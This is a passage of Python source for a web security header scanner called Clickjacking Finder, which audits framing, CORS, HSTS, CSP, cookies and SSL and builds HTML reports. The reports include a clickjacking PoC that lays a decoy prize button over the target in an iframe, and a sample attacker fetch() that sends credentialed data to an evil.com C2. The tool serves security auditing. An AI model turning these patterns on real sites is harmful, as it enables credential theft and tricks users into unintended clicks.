            'code_file':       'Web Server Security Headers (nginx.conf / httpd.conf)',
            'evidence':        'Permissions-Policy: NOT PRESENT',
            'root':            'No browser hardware feature controls (camera, microphone, geolocation) are defined for iframe contexts.',
            'impact':          'Embedded third-party scripts or frames can access sensitive browser hardware APIs within the origin context.',
            'attack_scenario': 'A compromised third-party script or ad framed within the application requests device geolocation or microphone access, presenting permissions under the trusted domain\'s authority.',
            'vuln_code':       "# Server lacks hardware feature restrictions\n# Missing Permissions-Policy",
            'secure_code':     "# Nginx:\nadd_header Permissions-Policy \"camera=(), microphone=(), geolocation=()\" always;",
            'cvss':            'CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:N/A:N | Score: 4.7',
            'fix':             "Define a restrictive Permissions-Policy header:\n"
                               "add_header Permissions-Policy \"camera=(), microphone=(), geolocation=()\" always;",
            'ref':             'https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Permissions-Policy',
            'poc':             False,
            'demo_type':       'headers'
        }
    return None

def chk_server_disclosure(hdrs):
    disclosed = []
    srv = hdrs.get('Server', '')
    if srv and any(c.isdigit() for c in srv):
        disclosed.append(f"Server: {srv}")
    xpb = hdrs.get('X-Powered-By', '')
    if xpb:
        disclosed.append(f"X-Powered-By: {xpb}")
    if disclosed:
        return {
            'id':              'SERVER_DISCLOSURE',
            'risk':            'LOW',
            'name':            'Web Server & Technology Banner Disclosure',
            'location':        'HTTP Response Headers -> Server / X-Powered-By',
            'code_file':       'Server Daemon Core Config (nginx.conf / httpd.conf / express)',
            'evidence':        ' | '.join(disclosed),
            'root':            'The web server broadcasts granular software names and version numbers in HTTP responses.',
            'impact':          'Aids threat actors during technology profiling. Specific software releases can be mapped to public CVE databases for targeted exploit execution.',
            'attack_scenario': 'Attacker inspects Server header, discovers exact outdated release (e.g., Apache 2.4.49), and immediately pulls verified remote exploits (e.g., CVE-2021-41773).',
            'vuln_code':       "# Default configurations emitting versions:\nServerTokens Full\nServerSignature On\nserver_tokens on;",
            'secure_code':     "# Nginx:\nserver_tokens off;\n\n# Apache:\nServerTokens Prod\nServerSignature Off\n\n// Express.js:\napp.disable('x-powered-by');",
            'cvss':            'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N | Score: 5.3',
            'fix':             "Disable banner emission in web server configs:\n"
                               "Nginx:  server_tokens off;\n"
                               "Apache: ServerTokens Prod; ServerSignature Off;\n"
                               "Express: app.disable('x-powered-by');",
            'ref':             'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/01-Information_Gathering/02-Fingerprint_Web_Server',
            'poc':             False,
            'demo_type':       'headers'
        }
    return None

def chk_ssl_certificate(host):
    try:
        ctx = ssl.create_default_context()
        with socket.create_connection((host, 443), timeout=TIMEOUT) as sock:
            with ctx.wrap_socket(sock, server_hostname=host) as ssock:
                cert = ssock.getpeercert()
                not_after = cert.get('notAfter')
                if not_after:
                    exp_date = datetime.strptime(not_after, '%b %d %H:%M:%S %Y %Z').replace(tzinfo=timezone.utc)
                    now_utc = datetime.now(timezone.utc)
                    days_left = (exp_date - now_utc).days
                    if days_left < 14:
                        sev = 'CRITICAL' if days_left <= 0 else 'HIGH'
                        return {
                            'id':              'SSL_EXPIRING',
                            'risk':            sev,
                            'name':            'SSL/TLS Certificate Expired or Expiring Soon',
                            'location':        f'{host}:443 (TLS Handshake Layer)',
                            'code_file':       'TLS Certificate Authority Automation / Certbot Crontab',
                            'evidence':        f'Certificate Expiry: {not_after} ({days_left} days remaining)',
                            'root':            'The SSL/TLS certificate is either expired or within the critical 14-day renewal threshold.',
                            'impact':          'Expired certificates trigger browser security warnings, breaking encrypted communications and undermining client trust.',
                            'attack_scenario': 'Expired certificates cause modern browsers to block access. Users may be tricked into accepting forged invalid certificates on untrusted networks.',
                            'vuln_code':       "# Manual certificate management without automated renewal daemon",
                            'secure_code':     "# Set up automatic Certbot renewal:\n0 0,12 * * * certbot renew -q",
                            'cvss':            'CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N | Score: 7.5',
                            'fix':             'Renew SSL/TLS certificate immediately through Certbot or your Certificate Authority.',
                            'ref':             'https://letsencrypt.org/',
                            'poc':             False,
                            'demo_type':       'ssl'
                        }
    except ssl.SSLCertVerificationError as e:
        return {
            'id':              'SSL_INVALID',
            'risk':            'HIGH',
            'name':            'Invalid or Self-Signed SSL/TLS Certificate',
            'location':        f'{host}:443 (TLS Handshake Layer)',
            'code_file':       'Web Server SSL Certificate Bindings (ssl_certificate path)',
            'evidence':        f'SSL Verification Error: {str(e)}',
            'root':            'The TLS certificate chain cannot be verified by trusted root authorities.',
            'impact':          'Users receive invalid certificate warnings; active adversaries on public Wi-Fi can easily intercept traffic using forged certificates.',
            'attack_scenario': 'Adversary intercepts network traffic and substitutes a self-signed certificate. Because the real site already uses an untrusted certificate, users are habituated to ignoring browser security warnings.',
            'vuln_code':       "# Self-signed certificate bound in production:\nssl_certificate /etc/ssl/selfsigned.crt;\nssl_certificate_key /etc/ssl/selfsigned.key;",
            'secure_code':     "# Valid CA certificate bound in production:\nssl_certificate /etc/letsencrypt/live/target.com/fullchain.pem;\nssl_certificate_key /etc/letsencrypt/live/target.com/privkey.pem;",
            'cvss':            'CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:N | Score: 7.4',
            'fix':             'Install a valid certificate issued by a recognized Certificate Authority (e.g., Let\'s Encrypt).',
            'ref':             'https://letsencrypt.org/',
            'poc':             False,
            'demo_type':       'ssl'
        }
    except Exception:
        pass
    return None

# ═══════════════════════════════════════════════════
#  SCAN ENGINE WORKER
# ═══════════════════════════════════════════════════

def scan_target(raw_url):
    url = raw_url.strip()
    if not url.startswith('http'):
        url = 'https://' + url

    parsed = urlparse(url)
    host = parsed.netloc.split(':')[0]
    target_ip = get_target_ip(host)
    
    findings = []
    t_start = datetime.now()

    try:
        req = Request(url, headers={'User-Agent': UA})
        resp = urlopen(req, timeout=TIMEOUT)
        hdrs = resp.info()
        status_code = resp.status
        final_url = resp.geturl()
    except HTTPError as e:
        hdrs = e.headers
        status_code = e.code
        final_url = url
    except Exception as e:
        return raw_url, url, target_ip, 0, 0, [], str(e), {}

    latency_ms = int((datetime.now() - t_start).total_seconds() * 1000)

    # 1. Header Assessments
    checks = [
        chk_clickjacking(hdrs, final_url),
        chk_cors_wildcard(hdrs),
        chk_cookies(hdrs),
        chk_hsts(hdrs, final_url),
        chk_csp(hdrs),
        chk_mime_sniffing(hdrs),
        chk_referrer_policy(hdrs),
        chk_permissions_policy(hdrs),
        chk_server_disclosure(hdrs)
    ]
    for c in checks:
        if c: findings.append(c)

    # 2. CORS Reflection
    c_ref = chk_cors_reflection(final_url)
    if c_ref: findings.append(c_ref)

    # 3. HTTP Methods
    c_meth = chk_http_methods(final_url)
    if c_meth: findings.append(c_meth)

    # 4. Sensitive Files
    c_files = chk_sensitive_files(final_url)
    findings.extend(c_files)

    # 5. SSL/TLS Certificate
    if final_url.startswith('https://'):
        c_ssl = chk_ssl_certificate(host)
        if c_ssl: findings.append(c_ssl)

    header_dict = dict(hdrs)
    return raw_url, final_url, target_ip, status_code, latency_ms, findings, None, header_dict

# ═══════════════════════════════════════════════════
#  SCORING UTILITIES
# ═══════════════════════════════════════════════════

def calc_score(findings):
    return sum(RISK_S.get(f['risk'], 0) for f in findings)

def get_overall_risk(score):
    if score >= 12: return 'CRITICAL', R
    if score >= 7:  return 'HIGH', R
    if score >= 3:  return 'MEDIUM', Y
    if score >= 1:  return 'LOW', C
    return 'SECURE', G

# ═══════════════════════════════════════════════════
#  TERMINAL PRINTER
# ═══════════════════════════════════════════════════

def print_banner():
    c = f'{C}{BO}'
    j = f'{G}{BO}'
    f = f'{M}{BO}'
    
    print(rf"""
  {c}██████╗       {j}██╗  {f}███████╗
 {c}██╔════╝       {j}██║  {f}██╔════╝
 {c}██║       ██╗  {j}██║  {f}█████╗  
 {c}██║       ██║  {j}██║  {f}██╔══╝  
 {c}╚██████╗  ╚█████╔╝  {f}██║     
  {c}╚═════╝   ╚════╝   {f}╚═╝     {RS}""")
    
    lines = [
        f"{Y}{BO}CLICKJACKING FINDER (CJF) v1.0{RS} — {W}{BO}Security Audit Suite{RS}",
        f"{C}[*]{RS} {BO}Developer  :{RS} {G}AVII-VERSE{RS} ({W}github.com/AVII-VERSE/CJF{RS})",
        f"{C}[*]{RS} {BO}Framework  :{RS} {W}High-Performance Multi-Threaded Engine{RS}",
        f"{C}[*]{RS} {BO}Audit Scope:{RS} {W}Clickjacking • CORS • HSTS • CSP • Secrets • SSL{RS}",
        f"{C}[*]{RS} {BO}PoC Engine :{RS} {G}Interactive UI Redressing Simulator + Live Demos{RS}",
    ]
    print_cyber_box("", lines, width=68, color=M)
    print()

def print_target_result(idx, total, raw_url, final_url, ip, status, latency, findings, err):
    width = 68
    top = f"{C}+" + ("=" * (width - 2)) + f"+{RS}"
    bot = f"{C}+" + ("=" * (width - 2)) + f"+{RS}"
    
    print()
    print(top)
    title = f"{W}{BO}[{idx}/{total}] TARGET:{RS} {C}{BO}{raw_url}{RS}"
    vis = len(strip_ansi(title))
    pad = width - 4 - vis
    print(f"{C}|{RS}  {title}" + (" " * max(0, pad)) + f"{C}|{RS}")
    print(bot)

    if err:
        print(f"  {R}[ERROR]{RS} Unable to connect to host: {err}\n")
        return

    score = calc_score(findings)
    risk_label, risk_color = get_overall_risk(score)

    print(f"  {DM}Address :{RS} {W}{ip}{RS} | {DM}Status :{RS} {G}{status} OK{RS} | {DM}Latency :{RS} {latency}ms")
    print(f"  {DM}Endpoint:{RS} {final_url}")
    print(f"  {DM}Posture :{RS} {risk_color}{BO}{risk_label}{RS} (Score: {score}) | {W}{len(findings)} Total Finding(s){RS}")
    print(f"  {DM}{'-' * (width - 4)}{RS}")

    if not findings:
        print(f"  {G}{BO}[PASS]{RS} No critical misconfigurations detected on checked endpoints.\n")
        return

    for i, f in enumerate(findings, 1):
        rc = RISK_C.get(f['risk'], C)
        print(f"  {BO}#{i} {rc}[{f['risk']}]{RS} {W}{BO}{f['name']}{RS}")
        print(f"     {DM}Location   :{RS} {f['location']}")
        print(f"     {DM}Code Target:{RS} {Y}{f.get('code_file', 'Server Config / Header Middleware')}{RS}")
        print(f"     {DM}Evidence   :{RS} {f['evidence']}")
        print(f"     {DM}Root Cause :{RS} {f['root'][:100]}...")
        scenario = f.get('attack_scenario', f['impact']).splitlines()[0]
        print(f"     {DM}What Can Happen:{RS} {R}{scenario}{RS}")
        print(f"     {DM}Remediation:{RS} {G}{f['fix'].splitlines()[0]}{RS}")
        print()

# ═══════════════════════════════════════════════════
#  INTERACTIVE HTML POC GENERATOR
# ═══════════════════════════════════════════════════

def build_demo_widget(finding, index):
    fid = finding.get('id', '')
    
    if fid == 'CLICKJACKING':
        return """
        <div class="demo-box">
            <div class="demo-title">🎮 Live Interactive Attack Demo</div>
            <p>This vulnerability allows visual UI redressing. Switch to <strong>Tab 1 (Live Clickjacking PoC)</strong> at the top to interact with the live frame overlay, move the opacity slider, and trigger simulated button clicks!</p>
            <button class="btn btn-sm" onclick="document.querySelector('.tab-nav .tab-btn').click()">🎯 Open Live Clickjacking Simulator</button>
        </div>
        """
    elif fid in ['CORS_REFLECT', 'CORS_WILDCARD']:
        return f"""
        <div class="demo-box">
            <div class="demo-title">🎮 Interactive CORS SOP Bypass Demo</div>
            <p>Simulate how an attacker page (e.g. <code>https://attacker.com</code>) triggers a cross-origin read request:</p>
            <div style="background: #1a202c; color: #68d391; font-family: monospace; font-size: 12px; padding: 10px; border-radius: 4px; margin: 8px 0;">
                // Malicious JavaScript running on evil.com:<br>
                fetch('{finding["location"].split("->")[0].strip()}', {{ credentials: 'include' }})<br>
                &nbsp;&nbsp;.then(res => res.json())<br>
                &nbsp;&nbsp;.then(data => sendToAttackerC2(data));
            </div>
            <button class="btn btn-sm" onclick="runCorsDemo({index})">⚡ Simulate Attack Execution</button>
            <div id="cors-out-{index}" class="demo-output" style="display: none;"></div>
        </div>
        """
    elif fid == 'INSECURE_COOKIE':
        return f"""
        <div class="demo-box">
            <div class="demo-title">🎮 Cookie Theft & Tampering Demo</div>
            <p>Observe how missing <code>HttpOnly</code> permits JavaScript to extract session tokens:</p>
            <button class="btn btn-sm" onclick="runCookieDemo({index})">🧪 Test document.cookie Access</button>
            <div id="cookie-out-{index}" class="demo-output" style="display: none;"></div>
        </div>
        """
    elif fid in ['MISSING_HSTS', 'WEAK_HSTS']:
        return f"""
        <div class="demo-box">
            <div class="demo-title">🎮 SSL Stripping (MITM Downgrade) Demo</div>
            <p>Simulate public Wi-Fi protocol downgrade attack:</p>
            <button class="btn btn-sm" onclick="runHstsDemo({index})">⚡ Simulate Wi-Fi Interception</button>
            <div id="hsts-out-{index}" class="demo-output" style="display: none;"></div>
        </div>
        """
    elif fid in ['MISSING_CSP', 'WEAK_CSP']:
        return f"""
        <div class="demo-box">
            <div class="demo-title">🎮 XSS Script Injection Demo</div>
            <p>Simulate unconstrained inline script execution due to absent Content Security Policy:</p>
            <button class="btn btn-sm" onclick="runCspDemo({index})">💥 Simulate Script Injection</button>
            <div id="csp-out-{index}" class="demo-output" style="display: none;"></div>
        </div>
        """
    elif fid in ['EXPOSED_ENV', 'EXPOSED_GIT']:
        return f"""
        <div class="demo-box">
            <div class="demo-title">🎮 Secret Exposure & Extraction Demo</div>
            <p>Sensitive file accessible at endpoint: <code>{finding["location"]}</code></p>
            <button class="btn btn-sm" onclick="window.open('{finding["location"]}', '_blank')">🔗 Inspect Exposed File In Browser</button>
        </div>
        """
    else:
        return f"""
        <div class="demo-box">
            <div class="demo-title">🎮 Technical Verification Evidence</div>
            <p>Observed response header anomaly: <code>{finding["evidence"]}</code></p>
        </div>
        """

def generate_poc_report(raw_url, final_url, ip, status, latency, findings, headers):
    safe_name = raw_url.replace('https://', '').replace('http://', '').replace('/', '_').replace(':', '_')
    report_file = f"{safe_name}_cjf_report.html"

    score = calc_score(findings)
    risk_label, _ = get_overall_risk(score)
    theme_color = {'CRITICAL': '#e53e3e', 'HIGH': '#dd6b20', 'MEDIUM': '#d69e2e', 'LOW': '#3182ce', 'SECURE': '#38a169'}.get(risk_label, '#718096')

    # Build Finding Accordions
    findings_html = ""
    for i, f in enumerate(findings, 1):
        badge_color = {'CRITICAL': '#e53e3e', 'HIGH': '#dd6b20', 'MEDIUM': '#d69e2e', 'LOW': '#3182ce'}.get(f['risk'], '#718096')
        fix_code = f['fix'].replace('\n', '<br>')
        scenario_html = f.get('attack_scenario', f['impact']).replace('\n', '<br>')
        vuln_code_html = f.get('vuln_code', '// No snippet available').replace('\n', '<br>')
        sec_code_html = f.get('secure_code', '// No snippet available').replace('\n', '<br>')
        demo_widget_html = build_demo_widget(f, i)

        findings_html += f"""
        <div class="card mb-4">
            <div class="card-header" style="border-left: 5px solid {badge_color};" onclick="toggleCard({i})">
                <span class="badge" style="background: {badge_color};">{f['risk']}</span>
                <strong class="title">#{i} {f['name']}</strong>
                <span class="location-tag">{f['location'][:42]}...</span>
            </div>
            <div class="card-body" id="card-{i}">
                <div class="row"><div class="label">📍 Runtime Component & Endpoint</div><div class="value code">{f['location']}</div></div>
                <div class="row"><div class="label">📁 Target Codebase / File Possibility</div><div class="value code-file">{f.get('code_file', 'Server / Header Config')}</div></div>
                <div class="row"><div class="label">🔍 Verified Technical Evidence (Real Server Data)</div><div class="value code-evidence">{f['evidence']}</div></div>
                <div class="row"><div class="label">⚠️ Root Cause Analysis</div><div class="value">{f['root']}</div></div>
                
                <div class="row">
                    <div class="label">⚡ What Can Happen (Real-World Attack Scenario)</div>
                    <div class="value alert-impact">{scenario_html}</div>
                </div>

                <!-- Code Comparison Block -->
                <div class="code-compare-grid">
                    <div class="code-box vuln-box">
                        <div class="code-title">❌ Vulnerable Implementation (Where Code Fails)</div>
                        <div class="code-content">{vuln_code_html}</div>
                    </div>
                    <div class="code-box fixed-box">
                        <div class="code-title">✅ Secure Patched Implementation (How to Fix)</div>
                        <div class="code-content">{sec_code_html}</div>
                    </div>
                </div>

                <!-- Interactive Demo Widget -->
                {demo_widget_html}

                <div class="row" style="margin-top: 14px;"><div class="label">CVSS 3.1 Severity Rating</div><div class="value cvss-pill">{f['cvss']}</div></div>
                <div class="row"><div class="label">Technical Reference</div><div class="value"><a href="{f['ref']}" target="_blank">{f['ref']}</a></div></div>
            </div>
        </div>
        """

    # Build Header Matrix
    header_rows = ""
    audited = ['X-Frame-Options', 'Content-Security-Policy', 'Strict-Transport-Security', 'X-Content-Type-Options', 'Referrer-Policy', 'Permissions-Policy', 'Access-Control-Allow-Origin', 'Set-Cookie', 'Server', 'X-Powered-By']
    for h in audited:
        val = headers.get(h)
        if val:
            header_rows += f"<tr><td><strong>{h}</strong></td><td class='present'>{val}</td><td class='badge-pass'>PASS</td></tr>"
        else:
            header_rows += f"<tr><td><strong>{h}</strong></td><td class='missing'>NOT PRESENT</td><td class='badge-fail'>MISSING</td></tr>"

    # ── Clickjacking PoC Section (Always Available & Active as Tab 1) ──
    cj_vuln = any(f['id'] == 'CLICKJACKING' for f in findings)
    cj_status_badge = '<span class="status-pill vuln">CRITICAL: VULNERABLE TO CLICKJACKING (Framing Permitted)</span>' if cj_vuln else '<span class="status-pill safe">PROTECTED: Framing Restricted by Headers</span>'
    
    cj_tab_content = f"""
    <div id="tab-poc" class="tab-content active">
        <div class="poc-container">
            <div class="poc-header">
                <div style="display: flex; align-items: center; justify-content: space-between; margin-bottom: 8px;">
                    <h3>Interactive Clickjacking (UI Redressing) PoC Demo</h3>
                    {cj_status_badge}
                </div>
                <p>This live proof-of-concept demonstrates how an attacker exploits missing framing protections by layering an invisible target frame beneath a deceptive decoy button.</p>
                <div class="server-notice">
                    <strong>💡 Local Browser Tip:</strong> If your browser blocks local cross-origin iframes on <code>file:///</code> paths, run <code>python Clickjacking_Finder.py --serve</code> to launch the built-in HTTP server on <code>http://127.0.0.1:8080/</code>.
                </div>
            </div>

            <!-- Simulator Controls -->
            <div class="poc-controls">
                <div class="mode-buttons">
                    <button class="btn btn-mode active" onclick="setMode('overlay', this)">🎯 Layered Overlay Mode</button>
                    <button class="btn btn-mode" onclick="setMode('split', this)">↔️ Side-by-Side Mode</button>
                    <button class="btn btn-mode" onclick="setMode('frame', this)">🖥️ Full Frame Mode</button>
                </div>
                <div class="action-buttons">
                    <button class="btn btn-sec" onclick="reloadIframe()">🔄 Reload Frame</button>
                    <button class="btn btn-sec" onclick="window.open('{final_url}', '_blank')">🔗 Open Target</button>
                </div>
                <div class="slider-box">
                    <span>Decoy Opacity:</span>
                    <input type="range" id="opacitySlider" min="0" max="100" value="40" oninput="adjustOpacity(this.value)">
                    <span id="opacityVal" style="font-weight: 700; min-width: 42px;">40%</span>
                </div>
            </div>

            <!-- Visual Simulation Arena -->
            <div id="simulatorStage" class="simulator-stage mode-overlay">
                <!-- Target Website Iframe (Layer 1 - Underneath) -->
                <div id="frameWrapper" class="frame-wrapper">
                    <div class="layer-tag">TARGET LAYER ({final_url})</div>
                    <iframe id="targetFrame" src="{final_url}" class="target-iframe"></iframe>
                </div>

                <!-- Attacker Decoy Overlay (Layer 2 - On Top) -->
                <div id="decoyOverlay" class="decoy-overlay">
                    <div class="layer-tag" style="background: #2b6cb0;">ATTACKER DECOY LAYER</div>
                    <div class="decoy-card">
                        <div class="decoy-icon">🎁</div>
                        <h2>Verification & Special Prize</h2>
                        <p>Complete single-click verification to claim your reward coupon.</p>
                        <button id="exploitBtn" class="decoy-button" onclick="recordClick(event)">
                            👉 CLICK HERE TO VERIFY & CLAIM 👈
                        </button>
                        <div class="decoy-hint">(Clicking this button penetrates the transparent overlay to hit underlying target controls)</div>
                    </div>
                </div>
            </div>

            <!-- Click Telemetry Monitor -->
            <div id="clickAlert" class="click-alert">
                <div class="telemetry-header">
                    <h4>⚡ CLICK INTERCEPTION REGISTERED!</h4>
                    <span id="clickCounter" class="click-counter">Total Clicks: 0</span>
                </div>
                <p><strong>Coordinates Intercepted:</strong> X: <span id="clickX" class="coord">0</span>px, Y: <span id="clickY" class="coord">0</span>px (Relative to Stage: <span id="clickRel" class="coord">0, 0</span>)</p>
                <p><strong>Exploit Mechanism:</strong> The user believes they are clicking the decoy "Claim" button. However, the browser dispatches the click through the transparent overlay directly onto <strong>{final_url}</strong> at the exact corresponding coordinate!</p>
            </div>
        </div>
    </div>
    """

    # Build Markdown Bug Report
    md_report = f"# Vulnerability Assessment Report - {final_url}\n\n"
    md_report += f"- Target Host: {final_url}\n"
    md_report += f"- IP Address : {ip}\n"
    md_report += f"- Scan Time  : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
    md_report += f"- Overall Posture: {risk_label} (Score: {score})\n\n---\n\n"
    for f in findings:
        md_report += f"## [{f['risk']}] {f['name']}\n"
        md_report += f"- Location: {f['location']}\n"
        md_report += f"- Code Target: {f.get('code_file', 'Server Config')}\n"
        md_report += f"- Evidence: {f['evidence']}\n"
        md_report += f"- CVSS 3.1: {f['cvss']}\n"
        md_report += f"- Root Cause: {f['root']}\n"
        md_report += f"- Attack Scenario: {f.get('attack_scenario', f['impact'])}\n"
        md_report += f"- Remediation:\n```\n{f['fix']}\n```\n\n"

    html = f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>CJF Assessment Report | {raw_url}</title>
<style>
    :root {{
        --bg-primary: #f8fafc;
        --bg-surface: #ffffff;
        --border-color: #cbd5e0;
        --text-primary: #1a202c;
        --text-muted: #718096;
        --accent: #2b6cb0;
        --danger: #e53e3e;
        --warning: #dd6b20;
        --success: #38a169;
    }}
    * {{ margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }}
    body {{ background: var(--bg-primary); color: var(--text-primary); line-height: 1.6; padding: 20px; }}
    .container {{ max-width: 1140px; margin: 0 auto; }}

    /* Header */
    .header-bar {{ background: var(--bg-surface); border: 1px solid var(--border-color); border-radius: 8px; padding: 20px 24px; margin-bottom: 20px; box-shadow: 0 1px 3px rgba(0,0,0,0.06); }}
    .header-title {{ display: flex; align-items: center; justify-content: space-between; margin-bottom: 8px; }}
    .header-title h1 {{ font-size: 20px; font-weight: 700; color: #2d3748; }}
    .meta-grid {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 14px; margin-top: 14px; }}
    .meta-item {{ background: #f7fafc; padding: 10px 14px; border-radius: 6px; border: 1px solid #edf2f7; }}
    .meta-item .label {{ font-size: 11px; text-transform: uppercase; color: var(--text-muted); font-weight: 700; }}
    .meta-item .val {{ font-size: 15px; font-weight: 700; margin-top: 2px; }}

    /* Tabs */
    .tab-nav {{ display: flex; gap: 8px; margin-bottom: 20px; border-bottom: 2px solid var(--border-color); overflow-x: auto; }}
    .tab-btn {{ background: none; border: none; padding: 12px 20px; font-size: 14px; font-weight: 700; color: var(--text-muted); cursor: pointer; border-bottom: 2px solid transparent; margin-bottom: -2px; white-space: nowrap; transition: 0.2s; }}
    .tab-btn:hover {{ color: var(--text-primary); }}
    .tab-btn.active {{ color: var(--accent); border-bottom-color: var(--accent); }}
    .tab-content {{ display: none; }}
    .tab-content.active {{ display: block; }}

    /* Findings Cards */
    .card {{ background: var(--bg-surface); border: 1px solid var(--border-color); border-radius: 8px; margin-bottom: 14px; overflow: hidden; box-shadow: 0 1px 2px rgba(0,0,0,0.04); }}
    .card-header {{ padding: 14px 18px; cursor: pointer; display: flex; align-items: center; gap: 12px; background: #ffffff; user-select: none; transition: 0.15s; }}
    .card-header:hover {{ background: #f7fafc; }}
    .badge {{ color: white; padding: 3px 8px; border-radius: 4px; font-size: 11px; font-weight: 700; }}
    .location-tag {{ margin-left: auto; font-size: 12px; color: var(--text-muted); font-family: monospace; }}
    .card-body {{ padding: 18px; border-top: 1px solid var(--border-color); background: #fafafa; display: block; }}
    .row {{ margin-bottom: 12px; }}
    .row .label {{ font-size: 11px; text-transform: uppercase; color: var(--text-muted); font-weight: 700; margin-bottom: 3px; }}
    .row .value {{ font-size: 13px; }}
    .code {{ font-family: Consolas, monospace; background: #edf2f7; padding: 4px 8px; border-radius: 4px; font-size: 12px; display: inline-block; }}
    .code-file {{ font-family: Consolas, monospace; background: #feebc8; color: #7b341e; padding: 4px 8px; border-radius: 4px; font-size: 12px; font-weight: 700; display: inline-block; border: 1px solid #fbd38d; }}
    .code-evidence {{ font-family: Consolas, monospace; background: #fff5f5; color: #c53030; padding: 8px; border-radius: 4px; border: 1px solid #feb2b2; font-size: 12px; word-break: break-all; }}
    .alert-impact {{ background: #fffaf0; border-left: 4px solid var(--warning); padding: 10px 14px; color: #744210; border-radius: 4px; font-size: 13px; }}
    .cvss-pill {{ font-family: Consolas, monospace; font-size: 12px; color: #4a5568; }}

    /* Code Comparison Grid */
    .code-compare-grid {{ display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin: 14px 0; }}
    @media (max-width: 768px) {{ .code-compare-grid {{ grid-template-columns: 1fr; }} }}
    .code-box {{ border-radius: 6px; overflow: hidden; border: 1px solid #cbd5e0; font-family: Consolas, monospace; font-size: 12px; }}
    .code-title {{ padding: 6px 12px; font-weight: 700; font-size: 11px; text-transform: uppercase; }}
    .vuln-box .code-title {{ background: #fed7d7; color: #9b2c2c; }}
    .fixed-box .code-title {{ background: #c6f6d5; color: #22543d; }}
    .code-content {{ padding: 10px 12px; background: #1a202c; color: #e2e8f0; line-height: 1.5; min-height: 80px; overflow-x: auto; }}

    /* Interactive Demo Box in Card */
    .demo-box {{ background: #ebf8ff; border: 1px solid #bee3f8; border-radius: 6px; padding: 14px; margin-top: 12px; }}
    .demo-title {{ font-size: 12px; font-weight: 800; color: #2b6cb0; text-transform: uppercase; margin-bottom: 6px; }}
    .btn-sm {{ background: #2b6cb0; color: white; border: none; padding: 6px 12px; border-radius: 4px; font-size: 11px; font-weight: 700; cursor: pointer; margin-top: 6px; }}
    .btn-sm:hover {{ opacity: 0.9; }}
    .demo-output {{ background: #1a202c; color: #68d391; font-family: monospace; font-size: 11px; padding: 10px; border-radius: 4px; margin-top: 8px; line-height: 1.6; }}

    /* Table */
    .table-container {{ background: var(--bg-surface); border: 1px solid var(--border-color); border-radius: 8px; overflow: hidden; }}
    table {{ width: 100%; border-collapse: collapse; text-align: left; font-size: 13px; }}
    th {{ background: #f7fafc; padding: 12px 16px; border-bottom: 1px solid var(--border-color); font-weight: 700; color: #4a5568; }}
    td {{ padding: 12px 16px; border-bottom: 1px solid #edf2f7; }}
    td.present {{ color: var(--success); font-family: monospace; word-break: break-all; }}
    td.missing {{ color: var(--danger); font-style: italic; }}
    .badge-pass {{ color: var(--success); font-weight: 700; }}
    .badge-fail {{ color: var(--danger); font-weight: 700; }}

    /* PoC Simulator */
    .poc-container {{ background: var(--bg-surface); border: 1px solid var(--border-color); border-radius: 8px; padding: 22px; }}
    .status-pill {{ padding: 4px 12px; border-radius: 20px; font-size: 12px; font-weight: 700; }}
    .status-pill.vuln {{ background: #fed7d7; color: #9b2c2c; border: 1px solid #feb2b2; }}
    .status-pill.safe {{ background: #c6f6d5; color: #22543d; border: 1px solid #9ae6b4; }}
    .server-notice {{ background: #ebf8ff; border: 1px solid #bee3f8; color: #2b6cb0; padding: 10px 14px; border-radius: 6px; font-size: 12px; margin: 12px 0 16px 0; }}
    .poc-controls {{ display: flex; align-items: center; gap: 12px; margin-bottom: 14px; flex-wrap: wrap; background: #f7fafc; padding: 10px 14px; border-radius: 6px; border: 1px solid #e2e8f0; }}
    .mode-buttons, .action-buttons {{ display: flex; gap: 6px; }}
    .btn {{ background: #2b6cb0; color: white; border: none; padding: 7px 14px; border-radius: 5px; font-size: 12px; font-weight: 700; cursor: pointer; transition: 0.15s; }}
    .btn:hover {{ opacity: 0.9; }}
    .btn.active {{ background: #1a365d; box-shadow: 0 0 0 2px #63b3ed; }}
    .btn-sec {{ background: #4a5568; }}
    .slider-box {{ display: flex; align-items: center; gap: 8px; margin-left: auto; font-size: 12px; font-weight: 600; color: #4a5568; }}
    .slider-box input {{ width: 140px; cursor: pointer; }}

    /* Simulator Arena */
    .simulator-stage {{ position: relative; width: 100%; height: 520px; border: 2px solid #a0aec0; border-radius: 8px; overflow: hidden; background: #ffffff; transition: 0.3s; }}
    .layer-tag {{ position: absolute; top: 8px; left: 8px; z-index: 10; background: rgba(0,0,0,0.75); color: #fff; font-size: 10px; font-weight: 700; padding: 2px 8px; border-radius: 3px; font-family: monospace; }}
    
    /* Overlay Mode */
    .mode-overlay .frame-wrapper {{ position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; }}
    .mode-overlay .target-iframe {{ width: 100%; height: 100%; border: none; }}
    .mode-overlay .decoy-overlay {{ position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(247, 250, 252, 0.40); z-index: 2; display: flex; align-items: center; justify-content: center; }}
    
    /* Split Mode */
    .mode-split {{ display: flex; }}
    .mode-split .frame-wrapper {{ width: 50%; height: 100%; position: relative; border-left: 2px dashed #cbd5e0; order: 2; }}
    .mode-split .target-iframe {{ width: 100%; height: 100%; border: none; }}
    .mode-split .decoy-overlay {{ width: 50%; height: 100%; position: relative; background: #f7fafc; display: flex; align-items: center; justify-content: center; order: 1; }}

    /* Frame Only Mode */
    .mode-frame .frame-wrapper {{ width: 100%; height: 100%; position: relative; }}
    .mode-frame .target-iframe {{ width: 100%; height: 100%; border: none; }}
    .mode-frame .decoy-overlay {{ display: none; }}

